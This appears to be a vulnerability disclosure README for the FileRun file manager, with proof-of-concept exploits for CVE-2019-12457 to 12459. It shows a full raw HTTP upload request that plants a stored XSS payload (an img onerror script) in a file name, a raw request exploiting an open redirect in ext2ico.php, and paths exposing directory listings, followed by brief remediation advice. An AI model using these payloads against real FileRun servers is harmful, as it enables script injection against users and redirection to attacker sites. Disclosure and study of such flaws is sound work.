# FileRun Vulnerabilities and Exploits
[FileRun](https://filerun.com) application has many vulnerabilities.

## CVE-2019-12457 - CVE-2019-12458 - CVE-2019-12459

## PoC - XSS
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-XXXXX

To exploit vulnerability, someone could upload an allowed file named ```“><img src=x onerror=prompt(document.domain)>``` to impact users who open the page.

```
POST /filerun/?module=fileman&section=do&page=up HTTP/1.1
Host: 172.16.191.129
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: */*
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://172.16.191.129/filerun/
Content-Type: multipart/form-data; boundary=---------------------------142096305821079611661465592403
Content-Length: 6034
DNT: 1
Connection: close
Cookie: FileRunSID=aqlneuv86ccj3pi4h476faopi5

-----------------------------142096305821079611661465592403
Content-Disposition: form-data; name="flowTotalSize"

5100
-----------------------------142096305821079611661465592403
Content-Disposition: form-data; name="flowIsFirstChunk"

1
-----------------------------142096305821079611661465592403
Content-Disposition: form-data; name="flowIsLastChunk"

1
-----------------------------142096305821079611661465592403
Content-Disposition: form-data; name="flowFilename"

â><img src=x onerror=prompt(document.domain)>.jpg
-----------------------------142096305821079611661465592403
Content-Disposition: form-data; name="path"

/ROOT/HOME
-----------------------------142096305821079611661465592403
Content-Disposition: form-data; name="file"; filename="â><img src=x onerror=prompt(document.domain)>.jpg"
Content-Type: image/jpg

<%@ I said you should learn! %>


-----------------------------142096305821079611661465592403--
```

![alt tag](https://emreovunc.com/blog/en/FileRun-XSS-Exploit-Vulnerability-02.png)

![alt tag](https://emreovunc.com/blog/en/FileRun-XSS-Exploit-Vulnerability-03.png)

## PoC - Open Redirect
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-XXXXX

An open redirect vulnerability exists in FileRun in '**/filerun/images/fico/ext2ico.php?theme=**' URL that allows attackers to redirect users to an arbitrary URL. A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect.

```
GET /filerun/images/fico/ext2ico.php?theme=https://filerun.com/isaid:)? HTTP/1.1
Host: 172.16.191.129
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Cookie: FileRunSID=8ig5vcpk39v1cilv3uq7dp8crn
Referer: http://172.16.191.129/filerun/js/min.php?v=2019.05.21
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0
Content-Length: 4
```
![alt tag](https://emreovunc.com/blog/en/FileRun-OpenRedirection-Vulnerability.png)


## PoC - Directory Listing
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12457

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12458

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12459

```
http://[server]/filerun/images/extjs/
http://[server]/filerun/css/ext-ux/
http://[server]/filerun/customizables/plugins/audio_player/
```
![alt tag](https://emreovunc.com/blog/en/FileRun-DirectoryListing-1.png)

![alt tag](https://emreovunc.com/blog/en/FileRun-DirectoryListing-2.png)

![alt tag](https://emreovunc.com/blog/en/FileRun-DirectoryListing-3.png)

## Remediation
You should make sure the directory does not contain sensitive information or you may want to restrict directory listings from the web server configuration.
